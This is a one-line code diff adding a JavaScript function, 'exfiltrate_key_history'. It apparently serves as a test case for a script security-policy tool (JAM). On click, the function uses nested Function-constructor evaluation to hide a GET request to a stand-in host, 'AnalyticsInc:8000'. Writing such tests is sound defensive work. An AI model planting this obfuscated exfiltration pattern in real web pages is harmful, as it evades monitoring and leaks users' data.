@@ -1,0 +1,1 @@
+function exfiltrate_key_history(){var nest=new String('var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest2", true);xmlhttp.send(null);\';return Function(exp);'),nest=JAM.call(Function,null,[nest]),nest=nest();nest()}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)
